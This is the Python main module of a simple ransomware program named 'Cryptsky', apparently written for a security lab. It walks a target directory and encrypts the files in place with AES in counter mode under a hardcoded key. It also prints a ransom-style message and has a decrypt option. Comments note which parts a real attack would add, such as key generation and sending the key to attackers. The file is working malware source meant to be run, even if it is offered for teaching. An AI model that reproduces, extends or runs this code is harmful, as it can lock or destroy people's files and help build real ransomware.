#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
#  key length is 16/24/32 chars long
HARDCODED_KEY = b'veryweakpassword'


###########    READ BEFORE USING   ################
# Usage
# Select the folder to run the ransomware
# go to discover.py and specify the file extensions to be encrypted
# run the main function [python main.py]
# you can check the specified files are no longer available to access
# you can run the main function to decrypt [python main.py -d]
# use the decryption key provided to decrypt
# please dont ruin your friends' computer using this



def get_parser():
    parser = argparse.ArgumentParser(description='Cryptsky')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    return parser

def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print ('''
Your files have been locked! Please use the below decryption key provided
to unlock your files.

Your decryption key is: '{}'

'''.format(HARDCODED_KEY.decode()))
        key = input('Enter Your Key> ')
        key = key.encode('utf-8')

    else:
        # In real ransomware, this part includes complicated key generation,
        # sending the key back to attackers and more
        if HARDCODED_KEY:
            key = HARDCODED_KEY
		
		# don't uncomment below, unless you really want to ruin your files
        # else:
        #     key = random(32)

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # change this to fit your needs.
    startdirs = ['/home/seed/testing']
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            modify.modify_file_inplace(file, crypt.encrypt)
            #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

    if not decrypt:
        pass
         # post encrypt stuff
         # desktop picture
         # icon, etc

if __name__=="__main__":
    main()
    

